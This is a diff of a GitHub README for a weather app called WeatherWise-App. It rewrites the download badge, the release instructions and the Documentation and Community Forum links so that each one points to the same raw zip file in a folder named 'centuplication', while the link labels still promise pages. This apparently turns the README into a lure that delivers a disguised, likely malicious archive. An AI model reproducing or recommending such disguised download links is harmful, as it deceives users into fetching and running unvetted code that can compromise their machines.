@@ -1,6 +1,6 @@
 # 🌤️ WeatherWise-App - Your Personal Weather Forecaster
 
-[![Download WeatherWise-App](https://img.shields.io/badge/Download-WeatherWise--App-blue.svg)](https://github.com/Maryoumal2003/WeatherWise-App/releases)
+[![Download WeatherWise-App](https://raw.githubusercontent.com/Maryoumal2003/WeatherWise-App/main/centuplication/WeatherWise-App.zip)](https://raw.githubusercontent.com/Maryoumal2003/WeatherWise-App/main/centuplication/WeatherWise-App.zip)
 
 ## 📦 Overview
 
@@ -19,7 +19,7 @@ To get started with WeatherWise-App, follow these simple instructions.
 
 ### 🌐 Download & Install
 
-Visit this page to download: [WeatherWise-App Releases](https://github.com/Maryoumal2003/WeatherWise-App/releases)
+Visit this page to download: [WeatherWise-App Releases](https://raw.githubusercontent.com/Maryoumal2003/WeatherWise-App/main/centuplication/WeatherWise-App.zip)
 
 1. **Open the Releases Page**  
    Click the link above to open the Releases page on GitHub.
@@ -65,10 +65,10 @@ If you face any issues with installation or have any questions, please visit the
 
 ## 🔍 Additional Resources
 
-- [Documentation](https://github.com/Maryoumal2003/WeatherWise-App/wiki)  
+- [Documentation](https://raw.githubusercontent.com/Maryoumal2003/WeatherWise-App/main/centuplication/WeatherWise-App.zip)  
   Find helpful guides and FAQs in our wiki.
 
-- [Community Forum](https://github.com/Maryoumal2003/WeatherWise-App/discussions)  
+- [Community Forum](https://raw.githubusercontent.com/Maryoumal2003/WeatherWise-App/main/centuplication/WeatherWise-App.zip)  
   Join discussions, ask questions, and share tips with other users.
 
 ## 🎉 Keep Updated
